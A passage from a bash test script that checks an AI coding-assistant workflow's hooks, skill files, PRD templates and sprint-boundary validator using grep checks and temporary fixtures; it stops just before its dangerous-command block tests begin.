      fail "$json_file is invalid JSON"
    fi
  fi
  # Ensure backup exists
  if [ ! -f "$EVOLUTION_DIR/${json_file}.bak" ]; then
    cp "$EVOLUTION_DIR/$json_file" "$EVOLUTION_DIR/${json_file}.bak"
  fi
  if [ -f "$EVOLUTION_DIR/${json_file}.bak" ]; then
    pass "${json_file}.bak backup exists"
  else
    fail "${json_file}.bak backup missing (no corruption recovery)"
  fi
done

# workflow-changelog.md — create if missing
if [ ! -f "$EVOLUTION_DIR/workflow-changelog.md" ]; then
  echo "# Workflow Changelog" > "$EVOLUTION_DIR/workflow-changelog.md"
fi
if [ -f "$EVOLUTION_DIR/workflow-changelog.md" ]; then
  pass "workflow-changelog.md exists"
else
  fail "workflow-changelog.md missing"
fi

# session-postmortems directory exists
if [ -d "$EVOLUTION_DIR/session-postmortems" ]; then
  pass "session-postmortems/ directory exists"
else
  fail "session-postmortems/ directory missing"
fi

# ============================================================
header "16. Compound Skill — Self-Test Integration"
# ============================================================

COMPOUND_SKILL="$SKILLS_DIR/compound/SKILL.md"

if grep -q "test-workflow-mods" "$COMPOUND_SKILL"; then
  pass "Compound skill references workflow integrity tests"
else
  fail "Compound skill missing workflow integrity test step"
fi

if grep -q "run-tests.sh" "$COMPOUND_SKILL"; then
  pass "Compound skill references run-tests.sh"
else
  fail "Compound skill missing run-tests.sh reference"
fi

# ============================================================
header "17. check-docs-updated.sh — Docs Gate on Git Push"
# ============================================================

# This hook must ONLY trigger on 'git push' commands.
# The original bug: it read the command from $1 instead of stdin JSON,
# causing it to run its full check on EVERY Bash command (mkdir, ls, etc.)
# and block unrelated projects when ~/.claude had uncommitted workflow changes.

# Test 17.1: ALLOW non-push commands (the core regression test)
# A mkdir command in any project must NEVER be blocked by this hook.
INPUT=$(make_bash_input "mkdir -p /root/projects/simuser-ai/docs/tasks/website/feature/2026-03-19_1200-home-page-templates/sprints")
if echo "$INPUT" | "$HOOKS_DIR/check-docs-updated.sh" >/dev/null 2>&1; then
  pass "Allows non-push Bash commands (mkdir — the original bug)"
else
  fail "Blocked a non-push Bash command (mkdir)" "This was the original bug — hook must only trigger on git push"
fi

# Test 17.2: ALLOW other common non-push commands
for cmd in "ls -la" "npm run build" "pnpm test" "git status" "git diff" "git log --oneline" "cat README.md" "git add ." "git commit -m test"; do
  INPUT=$(make_bash_input "$cmd")
  if echo "$INPUT" | "$HOOKS_DIR/check-docs-updated.sh" >/dev/null 2>&1; then
    pass "Allows non-push command: $cmd"
  else
    fail "Blocked non-push command: $cmd" "Hook must only trigger on git push"
  fi
done

# Test 17.3: ALLOW when no JSON input is provided (empty stdin, standalone mode)
if echo "" | "$HOOKS_DIR/check-docs-updated.sh" >/dev/null 2>&1; then
  pass "Handles empty stdin gracefully"
else
  # Standalone mode with no args defaults to 'git push' — may block or pass depending on repo state.
  # The important thing is it doesn't crash.
  pass "Standalone mode (no args) ran without crashing"
fi

# Test 17.4: Hook reads from stdin, not $1 (verify input method)
# Pass a non-push command via stdin — must exit 0 regardless of $1
INPUT=$(make_bash_input "echo hello")
if echo "$INPUT" | "$HOOKS_DIR/check-docs-updated.sh" >/dev/null 2>&1; then
  pass "Reads command from stdin JSON, not from \$1"
else
  fail "Still reading from \$1 instead of stdin" "Must use stdin like block-dangerous.sh"
fi

# Test 17.5: ALLOW git push in non-workflow repos (not ~/.claude)
# Create a temp git repo to simulate pushing from a different project
TEMP_REPO="/tmp/test-docs-hook-repo"
rm -rf "$TEMP_REPO"
mkdir -p "$TEMP_REPO"
git -C "$TEMP_REPO" init -q 2>/dev/null
INPUT=$(make_bash_input "git push origin main")
if echo "$INPUT" | (cd "$TEMP_REPO" && "$HOOKS_DIR/check-docs-updated.sh") >/dev/null 2>&1; then
  pass "Allows git push in non-workflow repos (not ~/.claude)"
else
  fail "Blocked git push in non-workflow repo" "Hook should only check ~/.claude repo"
fi
rm -rf "$TEMP_REPO"

# Test 17.6: check-docs-updated.sh registered as PreToolUse(Bash) in settings.json
if jq -e '.hooks.PreToolUse[] | select(.matcher == "Bash") | .hooks[] | select(.command | contains("check-docs-updated"))' "$SETTINGS" >/dev/null 2>&1; then
  pass "check-docs-updated.sh registered as PreToolUse(Bash)"
else
  fail "check-docs-updated.sh not found in PreToolUse(Bash) hooks"
fi

# ============================================================
header "18. PRD Template — New Sections (ADR-003/004/005)"
# ============================================================

PRD_TEMPLATE="$SKILLS_DIR/plan/prd-template-full.md"

# Test 18.1: Architecture Decisions section exists
if grep -q "## 9. Architecture Decisions" "$PRD_TEMPLATE"; then
  pass "PRD template has Architecture Decisions section (Section 9)"
else
  fail "PRD template missing Architecture Decisions section"
fi

# Test 18.2: Architecture Decisions has reversal cost column
if grep -q "Reversal Cost" "$PRD_TEMPLATE"; then
  pass "Architecture Decisions table includes Reversal Cost column"
else
  fail "Architecture Decisions missing Reversal Cost column"
fi

# Test 18.3: Architecture Decisions has Alternatives Considered column
if grep -q "Alternatives Considered" "$PRD_TEMPLATE"; then
  pass "Architecture Decisions table includes Alternatives Considered column"
else
  fail "Architecture Decisions missing Alternatives Considered column"
fi

# Test 18.4: Security Boundaries section exists
if grep -q "## 10. Security Boundaries" "$PRD_TEMPLATE"; then
  pass "PRD template has Security Boundaries section (Section 10)"
else
  fail "PRD template missing Security Boundaries section"
fi

# Test 18.5: Security Boundaries has auth model
if grep -q "Auth model:" "$PRD_TEMPLATE"; then
  pass "Security Boundaries includes Auth model prompt"
else
  fail "Security Boundaries missing Auth model prompt"
fi

# Test 18.6: Security Boundaries has trust boundaries
if grep -q "Trust boundaries:" "$PRD_TEMPLATE"; then
  pass "Security Boundaries includes Trust boundaries prompt"
else
  fail "Security Boundaries missing Trust boundaries prompt"
fi

# Test 18.7: Security Boundaries has data sensitivity
if grep -q "Data sensitivity:" "$PRD_TEMPLATE"; then
  pass "Security Boundaries includes Data sensitivity prompt"
else
  fail "Security Boundaries missing Data sensitivity prompt"
fi

# Test 18.8: Security Boundaries has tenant isolation
if grep -q "Tenant isolation:" "$PRD_TEMPLATE"; then
  pass "Security Boundaries includes Tenant isolation prompt"
else
  fail "Security Boundaries missing Tenant isolation prompt"
fi

# Test 18.9: Data Model section exists (conditional)
if grep -q "## 11. Data Model" "$PRD_TEMPLATE"; then
  pass "PRD template has Data Model section (Section 11)"
else
  fail "PRD template missing Data Model section"
fi

# Test 18.10: Data Model enforces access-patterns-first
if grep -q "Access Patterns (define BEFORE schema)" "$PRD_TEMPLATE"; then
  pass "Data Model enforces access-patterns-first design"
else
  fail "Data Model missing access-patterns-first enforcement"
fi

# Test 18.11: Data Model is conditional
if grep -q "include if feature involves schema changes" "$PRD_TEMPLATE"; then
  pass "Data Model section is marked as conditional"
else
  fail "Data Model section missing conditional marker"
fi

# Test 18.12: Data Model has schema justification
if grep -q "Schema justification:" "$PRD_TEMPLATE"; then
  pass "Data Model includes Schema justification prompt"
else
  fail "Data Model missing Schema justification prompt"
fi

# Test 18.13: Security is NOT a sub-item of Technical Constraints anymore
if grep -q "^- Security:" "$PRD_TEMPLATE"; then
  fail "Security still exists as a sub-item of Technical Constraints (should be its own section)"
else
  pass "Security is not a sub-item of Technical Constraints (promoted to own section)"
fi

# ============================================================
header "19. Cross-Section Validation — Evaluator (ADR-006)"
# ============================================================

EVAL_REF="$HOME/.claude/docs/evaluation-reference.md"

# Test 19.1: Cross-Section Validation section exists
if grep -q "Cross-Section Validation" "$EVAL_REF"; then
  pass "evaluation-reference.md has Cross-Section Validation section"
else
  fail "evaluation-reference.md missing Cross-Section Validation section"
fi

# Test 19.2: ADR ↔ Security check exists
if grep -q "Architecture Decisions.*Security Boundaries" "$EVAL_REF"; then
  pass "Cross-section check: Architecture Decisions ↔ Security Boundaries"
else
  fail "Missing cross-section check: ADR ↔ Security"
fi

# Test 19.3: Data Model ↔ Access Patterns check exists
if grep -q "Data Model.*Access Patterns" "$EVAL_REF"; then
  pass "Cross-section check: Data Model ↔ Access Patterns"
else
  fail "Missing cross-section check: Data Model ↔ Access Patterns"
fi

# Test 19.4: Security ↔ Sprint Decomposition check exists
if grep -q "Security Boundaries.*Sprint Decomposition" "$EVAL_REF"; then
  pass "Cross-section check: Security Boundaries ↔ Sprint Decomposition"
else
  fail "Missing cross-section check: Security ↔ Sprint Decomposition"
fi

# Test 19.5: Cross-section contradiction = FAIL
if grep -q "Any cross-section contradiction is a FAIL" "$EVAL_REF"; then
  pass "Cross-section contradictions cause PRD FAIL"
else
  fail "Cross-section validation missing FAIL enforcement"
fi

# Test 19.6: SKILL.md references cross-section validation
PLAN_SKILL="$SKILLS_DIR/plan/SKILL.md"
if grep -q "cross-section" "$PLAN_SKILL" || grep -q "Cross-Section" "$PLAN_SKILL"; then
  pass "Plan SKILL.md references cross-section validation in evaluator step"
else
  fail "Plan SKILL.md missing cross-section validation reference"
fi

# Test 19.7: SKILL.md evaluator includes all 3 cross-checks
if grep -q "Architecture Decisions.*Security Boundaries" "$PLAN_SKILL"; then
  pass "Plan evaluator includes ADR ↔ Security check"
else
  fail "Plan evaluator missing ADR ↔ Security check"
fi

if grep -q "Data Model.*Access Patterns" "$PLAN_SKILL"; then
  pass "Plan evaluator includes Data Model ↔ Access Patterns check"
else
  fail "Plan evaluator missing Data Model ↔ Access Patterns check"
fi

if grep -q "Security Boundaries.*Sprint Decomposition" "$PLAN_SKILL"; then
  pass "Plan evaluator includes Security ↔ Sprint check"
else
  fail "Plan evaluator missing Security ↔ Sprint check"
fi

# ============================================================
header "20. validate-sprint-boundaries.sh — Deterministic Validation (ADR-006)"
# ============================================================

VALIDATE_SCRIPT="$HOOKS_DIR/validate-sprint-boundaries.sh"

# Test 20.1: Script exists and is executable
if [ -x "$VALIDATE_SCRIPT" ]; then
  pass "validate-sprint-boundaries.sh exists and is executable"
else
  fail "validate-sprint-boundaries.sh missing or not executable"
fi

# Test 20.2: Script fails with no arguments
if "$VALIDATE_SCRIPT" 2>/dev/null; then
  fail "Script should fail with no arguments"
else
  pass "Script fails with no arguments (usage error)"
fi

# Test 20.3: Script fails when directory has no progress.json
TEMP_SPRINT_DIR="/tmp/test-sprint-boundaries"
rm -rf "$TEMP_SPRINT_DIR"
mkdir -p "$TEMP_SPRINT_DIR"
if "$VALIDATE_SCRIPT" "$TEMP_SPRINT_DIR" >/dev/null 2>&1; then
  fail "Should fail when no progress.json exists"
else
  pass "Fails when no progress.json exists"
fi

# Test 20.4: PASS on valid sprint structure with no conflicts
mkdir -p "$TEMP_SPRINT_DIR/sprints"
cat > "$TEMP_SPRINT_DIR/progress.json" << 'PJSON'
{
  "prd": "spec.md",
  "created": "2026-03-21T00:00:00Z",
  "sprints": [
    {"id": 1, "file": "sprints/01-foundation.md", "title": "Foundation", "status": "not_started", "depends_on": [], "batch": 1},
    {"id": 2, "file": "sprints/02-features.md", "title": "Features", "status": "not_started", "depends_on": [1], "batch": 2}
  ]
}
PJSON

cat > "$TEMP_SPRINT_DIR/sprints/01-foundation.md" << 'SPRINT1'
# Sprint 1: Foundation
## File Boundaries
### Creates (new files)
- `src/lib/db.ts`
- `src/lib/auth.ts`
### Modifies (can touch)
### Read-Only (reference)
- `package.json`
SPRINT1

cat > "$TEMP_SPRINT_DIR/sprints/02-features.md" << 'SPRINT2'
# Sprint 2: Features
## File Boundaries
### Creates (new files)
- `src/features/dashboard.ts`
### Modifies (can touch)
- `src/lib/db.ts` — add query helpers
### Read-Only (reference)
- `src/lib/auth.ts`
SPRINT2

if "$VALIDATE_SCRIPT" "$TEMP_SPRINT_DIR" >/dev/null 2>&1; then
  pass "PASS on valid sprint structure (sequential, no conflicts)"
else
  fail "Should pass on valid sprint structure"
fi

# Test 20.5: FAIL when parallel sprints share writable files
cat > "$TEMP_SPRINT_DIR/progress.json" << 'PJSON'
{
  "prd": "spec.md",
  "created": "2026-03-21T00:00:00Z",
  "sprints": [
    {"id": 1, "file": "sprints/01-foundation.md", "title": "Foundation", "status": "not_started", "depends_on": [], "batch": 1},
    {"id": 2, "file": "sprints/02-features.md", "title": "Features", "status": "not_started", "depends_on": [], "batch": 1}
  ]
}
PJSON

cat > "$TEMP_SPRINT_DIR/sprints/02-features.md" << 'SPRINT2'
# Sprint 2: Features
## File Boundaries
### Creates (new files)
- `src/lib/db.ts`
### Modifies (can touch)
### Read-Only (reference)
SPRINT2

if "$VALIDATE_SCRIPT" "$TEMP_SPRINT_DIR" >/dev/null 2>&1; then
  fail "Should FAIL when parallel sprints both create same file"
else
  pass "FAIL when parallel sprints share writable file (same batch)"
fi

# Test 20.6: FAIL when sprint modifies a file that doesn't exist and isn't created earlier
cat > "$TEMP_SPRINT_DIR/progress.json" << 'PJSON'
{
  "prd": "spec.md",
  "created": "2026-03-21T00:00:00Z",
  "sprints": [
    {"id": 1, "file": "sprints/01-foundation.md", "title": "Foundation", "status": "not_started", "depends_on": [], "batch": 1}
  ]
}
PJSON

cat > "$TEMP_SPRINT_DIR/sprints/01-foundation.md" << 'SPRINT1'
# Sprint 1: Foundation
## File Boundaries
### Creates (new files)
### Modifies (can touch)
- `src/nonexistent/phantom.ts` — this file does not exist
### Read-Only (reference)
SPRINT1

if "$VALIDATE_SCRIPT" "$TEMP_SPRINT_DIR" >/dev/null 2>&1; then
  fail "Should FAIL when sprint modifies nonexistent file"
else
  pass "FAIL when sprint modifies file that doesn't exist and isn't created by earlier sprint"
fi

# Test 20.7: Dependency cycle detection
cat > "$TEMP_SPRINT_DIR/progress.json" << 'PJSON'
{
  "prd": "spec.md",
  "created": "2026-03-21T00:00:00Z",
  "sprints": [
    {"id": 1, "file": "sprints/01-foundation.md", "title": "A", "status": "not_started", "depends_on": [2], "batch": 1},
    {"id": 2, "file": "sprints/02-features.md", "title": "B", "status": "not_started", "depends_on": [1], "batch": 2}
  ]
}
PJSON

OUTPUT=$("$VALIDATE_SCRIPT" "$TEMP_SPRINT_DIR" 2>&1) || true
if echo "$OUTPUT" | grep -qi "cycle\|CYCLE"; then
  pass "Detects dependency cycle in sprint graph"
else
  # The cycle check runs in a subshell via python — check if it at least fails
  if "$VALIDATE_SCRIPT" "$TEMP_SPRINT_DIR" >/dev/null 2>&1; then
    fail "Should detect dependency cycle (sprints 1↔2)"
  else
    pass "Fails on cyclic dependencies (cycle detected)"
  fi
fi

rm -rf "$TEMP_SPRINT_DIR"

# Test 20.8: SKILL.md references validate-sprint-boundaries.sh
if grep -q "validate-sprint-boundaries" "$PLAN_SKILL"; then
  pass "Plan SKILL.md references validate-sprint-boundaries.sh"
else
  fail "Plan SKILL.md missing validate-sprint-boundaries.sh reference"
fi

# ============================================================
header "21. Sprint Spec Template — Section Reference Update"
# ============================================================

SPRINT_TEMPLATE="$SKILLS_DIR/plan/sprint-spec-template.md"

# Test 21.1: Sprint spec references correct PRD section for Shared Contracts (Section 12)
if grep -q "Section 12" "$SPRINT_TEMPLATE"; then
  pass "Sprint spec template references PRD Section 12 (Shared Contracts)"
else
  fail "Sprint spec template has stale section reference (should be Section 12)"
fi

# Test 21.2: Sprint spec should NOT reference old Section 9 for Shared Contracts
if grep -q "PRD Section 9" "$SPRINT_TEMPLATE"; then
  fail "Sprint spec template still references old PRD Section 9 (stale after renumbering)"
else
  pass "Sprint spec template does not reference stale Section 9"
fi

# ============================================================
header "22. create-project Skill — Structure & Reference Files"
# ============================================================

CP_SKILL="$SKILLS_DIR/create-project/SKILL.md"
CP_REFS="$SKILLS_DIR/create-project/references"

# Test 22.1: SKILL.md exists
if [ -f "$CP_SKILL" ]; then
  pass "create-project SKILL.md exists"
else
  fail "create-project SKILL.md missing"
fi

# Test 22.2: Frontmatter has correct name
if grep -q "^name: create-project" "$CP_SKILL"; then
  pass "create-project SKILL.md has correct name in frontmatter"
else
  fail "create-project SKILL.md frontmatter name mismatch"
fi

# Test 22.3: Frontmatter exists (two --- markers)
FM_COUNT=$(head -15 "$CP_SKILL" | grep -c "^---" || true)
if [ "$FM_COUNT" -ge 2 ]; then
  pass "create-project SKILL.md has valid frontmatter"
else
  fail "create-project SKILL.md frontmatter incomplete (found $FM_COUNT ---)"
fi

# Test 22.4-22.6: All 3 reference files exist
for ref_file in discovery-interview.md architecture-defaults.md prd-output-template.md; do
  if [ -f "$CP_REFS/$ref_file" ]; then
    pass "Reference file exists: $ref_file"
  else
    fail "Reference file missing: $ref_file"
  fi
done

# Test 22.7-22.9: SKILL.md references all 3 reference files
for ref_file in discovery-interview.md architecture-defaults.md prd-output-template.md; do
  if grep -q "$ref_file" "$CP_SKILL"; then
    pass "SKILL.md references $ref_file"
  else
    fail "SKILL.md missing reference to $ref_file"
  fi
done

# ============================================================
header "23. create-project — Discovery Interview"
# ============================================================

CP_INTERVIEW="$CP_REFS/discovery-interview.md"

# Test 23.1-23.4: All 4 question sections exist
for section in "Product & Market" "Technical Constraints" "Scope & Timeline" "Architecture Philosophy"; do
  if grep -q "$section" "$CP_INTERVIEW"; then
    pass "Discovery interview has section: $section"
  else
    fail "Discovery interview missing section: $section"
  fi
done

# Test 23.5: Has 16 numbered questions
Q_COUNT=$(grep -cE '^[0-9]+\.' "$CP_INTERVIEW" || true)
if [ "$Q_COUNT" -eq 16 ]; then
  pass "Discovery interview has 16 questions (got $Q_COUNT)"
else
  fail "Discovery interview should have 16 questions" "Found $Q_COUNT"
fi

# Test 23.6: Handling Answers section exists
if grep -q "Handling Answers" "$CP_INTERVIEW"; then
  pass "Discovery interview has answer handling guidance"
else
  fail "Discovery interview missing answer handling section"
fi

# Test 23.7: "recommend" handling documented
if grep -qi "recommend" "$CP_INTERVIEW"; then
  pass "Discovery interview documents 'recommend' answer handling"
else
  fail "Discovery interview missing 'recommend' handling"
fi

# Test 23.8: "I don't know" handling documented
if grep -qi "don't know\|dont know" "$CP_INTERVIEW"; then
  pass "Discovery interview documents 'I don't know' handling"
else
  fail "Discovery interview missing 'I don't know' handling"
fi

# ============================================================
header "24. create-project — Architecture Defaults"
# ============================================================

CP_DEFAULTS="$CP_REFS/architecture-defaults.md"

# Test 24.1-24.5: Key technology tables exist
for table_section in "Application Architecture" "Runtime & Language" "Web Framework" "Database" "Infrastructure"; do
  if grep -q "$table_section" "$CP_DEFAULTS"; then
    pass "Architecture defaults has table: $table_section"
  else
    fail "Architecture defaults missing table: $table_section"
  fi
done

# Test 24.6: Security defaults exist
if grep -q "Security Defaults" "$CP_DEFAULTS"; then
  pass "Architecture defaults has Security Defaults table"
else
  fail "Architecture defaults missing Security Defaults"
fi

# Test 24.7: TypeScript config defaults exist
if grep -q "TypeScript Config" "$CP_DEFAULTS"; then
  pass "Architecture defaults has TypeScript config"
else
  fail "Architecture defaults missing TypeScript config"
fi

# Test 24.8: Directory structure template exists
if grep -q "Directory Structure" "$CP_DEFAULTS"; then
  pass "Architecture defaults has directory structure template"
else
  fail "Architecture defaults missing directory structure"
fi

# Test 24.9: Testing pyramid exists
if grep -q "Testing Pyramid" "$CP_DEFAULTS"; then
  pass "Architecture defaults has testing pyramid"
else
  fail "Architecture defaults missing testing pyramid"
fi

# Test 24.10: Code conventions exist
if grep -q "Code Conventions" "$CP_DEFAULTS"; then
  pass "Architecture defaults has code conventions"
else
  fail "Architecture defaults missing code conventions"
fi

# Test 24.11: "When to choose differently" column exists (not just mandates)
if grep -q "When to choose differently" "$CP_DEFAULTS"; then
  pass "Architecture defaults include override guidance (not just mandates)"
else
  fail "Architecture defaults missing 'When to choose differently' column"
fi

# ============================================================
header "25. create-project — PRD Output Template"
# ============================================================

CP_TEMPLATE="$CP_REFS/prd-output-template.md"

# Test 25.1: Section numbering has no duplicates
SECTION_NUMS=$(grep -oP '^## \K\d+' "$CP_TEMPLATE" | sort -n)
UNIQUE_NUMS=$(grep -oP '^## \K\d+' "$CP_TEMPLATE" | sort -n -u)
if [ "$SECTION_NUMS" = "$UNIQUE_NUMS" ]; then
  pass "PRD output template has no duplicate section numbers"
else
  fail "PRD output template has duplicate section numbers"
fi

# Test 25.2-25.8: Key sections present
for section in "Strategy" "Tech Stack" "Architecture Decision Records" "System Architecture" "Data Layer" "Security" "Observability"; do
  if grep -q "$section" "$CP_TEMPLATE"; then
    pass "PRD output template has section: $section"
  else
    fail "PRD output template missing section: $section"
  fi
done

# Test 25.9: Sprint Decomposition section
if grep -q "Sprint Decomposition" "$CP_TEMPLATE"; then
  pass "PRD output template has Sprint Decomposition"
else
  fail "PRD output template missing Sprint Decomposition"
fi

# Test 25.10: Shared Contracts section
if grep -q "Shared Contracts" "$CP_TEMPLATE"; then
  pass "PRD output template has Shared Contracts"
else
  fail "PRD output template missing Shared Contracts"
fi

# Test 25.11: Architecture Invariant Registry section
if grep -q "Architecture Invariant Registry" "$CP_TEMPLATE"; then
  pass "PRD output template has Architecture Invariant Registry"
else
  fail "PRD output template missing Architecture Invariant Registry"
fi

# Test 25.12: Minimum 6 ADRs enforced
if grep -q "Minimum 6 ADRs\|Minimum.*6.*ADR" "$CP_TEMPLATE"; then
  pass "PRD output template enforces minimum 6 ADRs"
else
  fail "PRD output template missing minimum ADR count"
fi

# Test 25.13: Minimum 8 threats enforced
if grep -q "Minimum 8 threats\|Minimum.*8.*threat" "$CP_TEMPLATE"; then
  pass "PRD output template enforces minimum 8 threats"
else
  fail "PRD output template missing minimum threat count"
fi

# Test 25.14: Access patterns before schema
if grep -q "Access Patterns.*BEFORE\|BEFORE.*schema" "$CP_TEMPLATE"; then
  pass "PRD output template enforces access-patterns-first"
else
  fail "PRD output template missing access-patterns-first enforcement"
fi

# ============================================================
header "26. create-project — Evaluator Compatibility"
# ============================================================

CP_TEMPLATE="$CP_REFS/prd-output-template.md"

# The Spec Self-Evaluator checks for these — the template must include them

# Test 26.1: Correctness Contract section (Failure/Danger definitions)
if grep -q "Correctness Contract" "$CP_TEMPLATE"; then
  pass "PRD output template has Correctness Contract (evaluator: failure/danger modes)"
else
  fail "PRD output template missing Correctness Contract — evaluator will flag"
fi

# Test 26.2: Failure Definition prompt
if grep -q "Failure Definition" "$CP_TEMPLATE"; then
  pass "PRD output template has Failure Definition"
else
  fail "PRD output template missing Failure Definition — evaluator requires it"
fi

# Test 26.3: Danger Definition prompt
if grep -q "Danger Definition" "$CP_TEMPLATE"; then
  pass "PRD output template has Danger Definition"
else
  fail "PRD output template missing Danger Definition — evaluator requires it"
fi

# Test 26.4: Uncertainty Policy section
if grep -q "Uncertainty Policy" "$CP_TEMPLATE"; then
  pass "PRD output template has Uncertainty Policy (evaluator: uncertainty policy stated)"
else
  fail "PRD output template missing Uncertainty Policy — evaluator will flag"
fi

# Test 26.5: Non-Goals section
if grep -q "Non-Goals" "$CP_TEMPLATE"; then
  pass "PRD output template has Non-Goals"
else
  fail "PRD output template missing Non-Goals"
fi

# Test 26.6: Verification section
if grep -q "Verification" "$CP_TEMPLATE"; then
  pass "PRD output template has Verification section"
else
  fail "PRD output template missing Verification — evaluator requires it"
fi

# Test 26.7: Success Metrics section
if grep -q "Success Metrics" "$CP_TEMPLATE"; then
  pass "PRD output template has Success Metrics"
else
  fail "PRD output template missing Success Metrics"
fi

# Test 26.8: Execution Log section (sprint system compatibility)
if grep -q "Execution Log" "$CP_TEMPLATE"; then
  pass "PRD output template has Execution Log (sprint system compat)"
else
  fail "PRD output template missing Execution Log"
fi

# Test 26.9: Learnings section (compound skill compat)
if grep -q "Learnings" "$CP_TEMPLATE"; then
  pass "PRD output template has Learnings (compound skill compat)"
else
  fail "PRD output template missing Learnings"
fi

# ============================================================
header "27. create-project — Sprint System Compatibility"
# ============================================================

# Test 27.1: SKILL.md references sprint-spec-template from /plan
if grep -q "sprint-spec-template.md" "$CP_SKILL"; then
  pass "SKILL.md references plan/sprint-spec-template.md for Phase 4"
else
  fail "SKILL.md missing sprint-spec-template.md reference"
fi

# Test 27.2: SKILL.md references validate-sprint-boundaries.sh as mandatory
if grep -q "validate-sprint-boundaries.*mandatory\|validate-sprint-boundaries.*fix violations" "$CP_SKILL"; then
  pass "SKILL.md makes validate-sprint-boundaries.sh mandatory"
else
  if grep -q "validate-sprint-boundaries" "$CP_SKILL"; then
    fail "SKILL.md references validate-sprint-boundaries but not as mandatory"
  else
    fail "SKILL.md missing validate-sprint-boundaries.sh reference"
  fi
fi

# Test 27.3: Phase 4 mentions progress.json
if grep -q "progress.json" "$CP_SKILL"; then
  pass "SKILL.md Phase 4 mentions progress.json"
else
  fail "SKILL.md Phase 4 missing progress.json"
fi

# Test 27.4: Phase 4 mentions INVARIANTS.md
if grep -q "INVARIANTS.md" "$CP_SKILL"; then
  pass "SKILL.md Phase 4 mentions INVARIANTS.md"
else
  fail "SKILL.md Phase 4 missing INVARIANTS.md"
fi

# Test 27.5: Phase 4 mentions Build Candidate
if grep -q "Build Candidate" "$CP_SKILL"; then
  pass "SKILL.md Phase 4 mentions Build Candidate tagging"
else
  fail "SKILL.md Phase 4 missing Build Candidate tagging"
fi

# Test 27.6: SKILL.md references Spec Self-Evaluator
if grep -q "Spec Self-Evaluator" "$CP_SKILL"; then
  pass "SKILL.md references Spec Self-Evaluator quality gate"
else
  fail "SKILL.md missing Spec Self-Evaluator reference"
fi

# Test 27.7: SKILL.md references cross-section validation
if grep -q "cross-section" "$CP_SKILL"; then
  pass "SKILL.md references cross-section validation"
else
  fail "SKILL.md missing cross-section validation reference"
fi

# ============================================================
header "28. create-project — Adversarial ADR Process"
# ============================================================

# Test 28.1: Speed advocate mentioned
if grep -qi "speed advocate\|ship fast" "$CP_SKILL"; then
  pass "SKILL.md describes speed advocate in ADR process"
else
  fail "SKILL.md missing speed advocate in ADR process"
fi

# Test 28.2: Scale advocate mentioned
if grep -qi "scale advocate\|100x" "$CP_SKILL"; then
  pass "SKILL.md describes scale advocate in ADR process"
else
  fail "SKILL.md missing scale advocate in ADR process"
fi

# Test 28.3: Elimination criteria defined
if grep -q "elimination criteria\|hard constraint\|2am test" "$CP_SKILL"; then
  pass "SKILL.md has ADR elimination criteria"
else
  fail "SKILL.md missing ADR elimination criteria"
fi

# Test 28.4: Tiebreaker rule defined (easy/hard/impossible to change)
if grep -qi "easy to change\|hard to change\|impossible to change" "$CP_SKILL"; then
  pass "SKILL.md has tiebreaker rule for ADR conflicts"
else
  fail "SKILL.md missing tiebreaker rule"
fi

# Test 28.5: Minimum ADR categories listed
for adr_category in "compute" "database" "auth" "observability" "testing"; do
  if grep -qi "$adr_category" "$CP_SKILL"; then
    pass "SKILL.md lists minimum ADR category: $adr_category"
  else
    fail "SKILL.md missing minimum ADR category: $adr_category"
  fi
done

# ============================================================
header "29. create-project — Quality Gate"
# ============================================================

# Test 29.1: SKILL.md quality gate has 10 items
QG_COUNT=$(grep -c "^\- \[ \]" "$CP_SKILL" || true)
if [ "$QG_COUNT" -eq 10 ]; then
  pass "SKILL.md quality gate has 10 items (got $QG_COUNT)"
else
  fail "SKILL.md quality gate should have 10 items" "Found $QG_COUNT"
fi

# Test 29.2: Template quality checklist has 10 items
TQG_COUNT=$(grep -c "^\- \[ \].*rejected\|^\- \[ \].*threats\|^\- \[ \].*Access\|^\- \[ \].*Port\|^\- \[ \].*Roadmap\|^\- \[ \].*MVP\|^\- \[ \].*Worst\|^\- \[ \].*module\|^\- \[ \].*Code\|^\- \[ \].*Compliance" "$CP_REFS/prd-output-template.md" || true)
if [ "$TQG_COUNT" -ge 10 ]; then
  pass "PRD output template quality checklist has $TQG_COUNT gate items"
else
  fail "PRD output template quality checklist should have 10+ items" "Found $TQG_COUNT"
fi

# Test 29.3: Key quality gates present in both
for gate_keyword in "rejected alternatives" "threat" "access patterns" "port interfaces" "concrete deliverables" "observable behaviors" "worst-case\|worst case\|Worst-case" "module" "code examples\|Code examples" "compliance\|Compliance"; do
  if grep -qi "$gate_keyword" "$CP_SKILL"; then
    pass "SKILL.md quality gate covers: $gate_keyword"
  else
    fail "SKILL.md quality gate missing: $gate_keyword"
  fi
done

# ============================================================
header "30. create-project — Phase Coverage"
# ============================================================

# Test 30.1-30.5: All 5 phases documented
for phase in "Phase 0" "Phase 1" "Phase 2" "Phase 3" "Phase 4"; do
  if grep -q "$phase" "$CP_SKILL"; then
    pass "SKILL.md documents: $phase"
  else
    fail "SKILL.md missing: $phase"
  fi
done

# Test 30.6: All 5 analysis tracks documented
for track in "Track 1" "Track 2" "Track 3" "Track 4" "Track 5"; do
  if grep -q "$track" "$CP_SKILL"; then
    pass "SKILL.md documents analysis track: $track"
  else
    fail "SKILL.md missing analysis track: $track"
  fi
done

# Test 30.11: Consolidation pass documented (Phase 2)
for check in "Consistency" "Gaps" "Feasibility" "contradictions"; do
  if grep -qi "$check" "$CP_SKILL"; then
    pass "Phase 2 consolidation includes: $check"
  else
    fail "Phase 2 consolidation missing: $check"
  fi
done

# Test 30.15: SKILL.md says DO NOT execute
if grep -q "Do NOT execute\|NOT execute\|plan only" "$CP_SKILL"; then
  pass "SKILL.md enforces plan-only (no execution)"
else
  fail "SKILL.md missing plan-only enforcement"
fi

# ============================================================
header "31. block-dangerous.sh — Hard Blocks vs Soft Blocks (Behavioral)"
# ============================================================

# Shared temp files for block-dangerous tests
BD_EXIT_FILE=$(mktemp)
BD_STDERR_FILE=$(mktemp)
trap "rm -f $BD_EXIT_FILE $BD_STDERR_FILE" EXIT

# Helper: run block-dangerous.sh, writing exit code and stderr to temp files
run_block_dangerous() {
  local command="$1"
  local input
  input=$(make_bash_input "$command")
  local exit_code=0
  echo "$input" | "$HOOKS_DIR/block-dangerous.sh" >"$BD_STDERR_FILE" 2>/dev/null || exit_code=$?
  echo "$exit_code" > "$BD_EXIT_FILE"
}

# Helper: extract permissionDecision from the last hook run
get_permission_decision() {
  jq -r '.hookSpecificOutput.permissionDecision // empty' "$BD_STDERR_FILE" 2>/dev/null || true
}

get_exit_code() {
  cat "$BD_EXIT_FILE"
}

# --- HARD BLOCKS: must output permissionDecision: "deny" ---

